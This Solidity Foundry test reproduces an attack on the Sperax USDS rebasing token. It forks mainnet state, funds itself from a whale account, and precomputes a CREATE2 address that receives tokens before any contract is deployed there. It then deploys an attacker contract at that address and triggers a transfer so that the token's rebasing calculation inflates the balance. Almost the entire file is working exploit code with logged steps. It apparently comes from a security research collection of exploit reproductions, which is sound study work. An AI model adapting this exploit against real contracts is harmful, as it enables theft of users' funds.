// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

contract Exploit_Usds is TestHarness, TokenBalanceTracker {
    IERC20 internal usds = IERC20(0xD74f5255D557944cf7Dd0E45FF521520002D5748); // sperax token
    address internal usdsWhale = 0x50450351517117Cb58189edBa6bbaD6284D45902;

    ContractFactory internal factory;

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 57803396);

        // As USDS is behind a proxy, Foundry does not
        // let us deal directly to it.
        // That's why we use `cheat.prank` to transfer
        // 20e18 USDS to this address from the USDSWhale account
        // deal(address(usds), address(this), 20e18); // because USDS is behind a proxy, this fails on
        // foundry.
        cheat.prank(usdsWhale);
        usds.transfer(address(this), 20e18);
        cheat.deal(address(this), 0);

        factory = new ContractFactory();

        addTokenToTracker(address(usds));
        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        console.log("===== INITIAL BALANCES =====");
        logBalancesWithLabel("\nAttacker EOA", address(this));

        console.log("===== 1. Send tokens to precomputed address =====");
        address precomputedAddr = factory.getAddress(factory.getBytecode(address(this)), uint256(9_122_018));
        updateBalanceTracker(precomputedAddr);
        console.log("Sending tokens to %s", precomputedAddr);
        usds.transfer(precomputedAddr, 11e18);
        logBalancesWithLabel("\nAttacker Token Handler Contract (precompute)", precomputedAddr);

        console.log("===== 2. Deploy contract with Create2 =====");
        address deployedAddr = factory.deploy(address(this), bytes32(uint256(9_122_018)));
        require(deployedAddr == precomputedAddr, "address mismatch");
        logBalancesWithLabel("\nAttacker Token Handler Contract (deployed == precompute)", deployedAddr);

        console.log("===== 3. Update rebasing calculation of USDS =====");
        AttackerContract(deployedAddr).transferERC20(address(usds), address(this), 1);
        logBalancesWithLabel("\nAttacker Token Handler Contract (after update)", deployedAddr);
    }
}

contract ContractFactory {
    // Gets bytecode to help precomputing the address
    function getBytecode(address _owner) public pure returns (bytes memory) {
        bytes memory bytecode = type(AttackerContract).creationCode;

        return abi.encodePacked(bytecode, abi.encode(_owner));
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));

        return address(uint160(uint256(hash)));
    }

    function deploy(address _owner, bytes32 _salt) public payable returns (address) {
        return address(new AttackerContract{salt: _salt}(_owner));
    }
}

contract AttackerContract {
    // This is a simple token handler contract.
    // The attacker used a 1/1 Gnosis Safe and precomputed its address. The deployed it with a create2
    // dependant method.
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function transferERC20(address _ERC20, address _to, uint256 amt) external onlyOwner {
        IERC20(_ERC20).transfer(_to, amt); // this can revert or return false.
    }
}
